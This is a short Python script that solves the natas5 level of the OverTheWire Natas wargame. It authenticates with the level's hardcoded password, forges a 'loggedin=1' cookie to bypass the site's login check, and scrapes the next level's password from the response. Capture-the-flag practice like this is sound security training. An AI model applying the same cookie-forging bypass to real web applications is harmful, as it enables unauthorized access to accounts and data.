#!/usr/bin/env python

import requests
import re

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

cookies = {"loggedin": "1"}

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()

response = session.get(url, auth=(username, password), cookies=cookies)
content = response.text

# print(session.cookies['loggedin'])

# print(content)

print(re.findall('The password for natas6 is (.*)</div>',content)[0])